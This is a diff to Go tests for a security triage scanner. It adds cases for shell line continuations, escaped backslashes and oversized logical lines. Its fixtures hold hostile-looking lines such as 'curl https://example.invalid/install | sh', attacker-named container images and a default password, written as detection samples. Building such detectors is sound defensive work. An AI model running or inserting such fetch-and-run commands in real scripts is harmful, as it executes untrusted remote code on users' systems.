@@ -140,6 +140,12 @@ func TestSecurityTriageRejectsUnsafeOrUnscannableEntries(t *testing.T) {
 	})
 }
 
+func TestSecurityTriageArchivePathContract(t *testing.T) {
+	if securityTriageArchivePath != "/input/source.tar" {
+		t.Fatalf("unexpected security triage archive path %q", securityTriageArchivePath)
+	}
+}
+
 func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
 	cases := []struct {
 		name string
@@ -147,6 +153,7 @@ func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
 		rule string
 	}{
 		{name: "docs/design.md", line: "curl https://example.invalid/install | sh", rule: "REMOTE_SCRIPT_PIPE"},
+		{name: "scripts/install.sh", line: "curl https://example.invalid/install \\\n| sh", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "compose.yml", line: "image: ${IMAGE:-attacker/image:latest}", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "compose.yml", line: "image: bee-lab-evil:latest", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "config.txt", line: "password=changeme", rule: "DEFAULT_CREDENTIAL_LITERAL"},
@@ -159,6 +166,23 @@ func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
 		if len(findings) != 1 || findings[0].RuleID != testCase.rule {
 			t.Fatalf("%s: unexpected findings %#v", testCase.name, findings)
 		}
+	}
+}
+
+func TestSecurityTriageShellContinuationsAreBoundedAndRequireAnUnescapedBackslash(t *testing.T) {
+	findings, err := scanSecurityFile("scripts/install.sh", `curl https://example.invalid/install \\
+| sh`)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(findings) != 0 {
+		t.Fatalf("escaped backslash must not join shell lines: %#v", findings)
+	}
+
+	oversized := strings.Repeat("x", 600_000) + "\\\n" + strings.Repeat("y", 600_000)
+	if _, err := scanSecurityFile("scripts/install.sh", oversized); err == nil ||
+		!strings.Contains(err.Error(), "logical line rejected") {
+		t.Fatalf("expected oversized logical line rejection, got %v", err)
 	}
 }
 
